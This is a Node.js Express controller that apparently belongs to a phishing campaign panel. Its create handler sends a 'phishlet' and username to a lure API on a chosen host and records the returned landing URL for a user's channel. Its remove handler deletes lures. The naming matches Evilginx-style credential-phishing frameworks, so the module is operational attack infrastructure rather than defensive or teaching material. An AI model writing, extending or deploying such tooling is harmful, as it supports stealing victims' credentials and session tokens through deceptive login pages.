const axios = require("axios");
const lureService = require("../service/lure");
const db = require("../model/index");
const { lureApiUrl } = require("../config");

const User = db.user;

const resolve = (data, res) =>
  res.status(200).send({
    success: true,
    data,
  });

const reject = (err, res) => {
  console.log("User Service Error:", err);
  return res.status(500).send({
    success: false,
    message: err.message || "Some error occurred",
  });
};

exports.create = (req, res) => {
  const { username, phishlet, hostAddr } = req.body;
  User.findOne({
    where: {
      name: username,
    },
  })
    .then(async (data) => {
      const lure = await axios.post(
        `${lureApiUrl.replace("%HOSTADDR%", hostAddr)}/create`,
        {
          phishlet,
          username,
        }
      );
      if (lure.data.success) {
        lureService
          .create({
            channel: data.channel,
            username,
            landingUrl: lure.data.url,
          })
          .then((data) => resolve(data, res))
          .catch((err) => reject(err, res));
      } else res.status(500).send(lure.errorDescription);
    })
    .catch((err) => reject(err, res));
};

exports.remove = (req, res) => {
  lureService
    .delete(req.body.id)
    .then((data) => resolve(data, res))
    .catch((err) => reject(err, res));
};
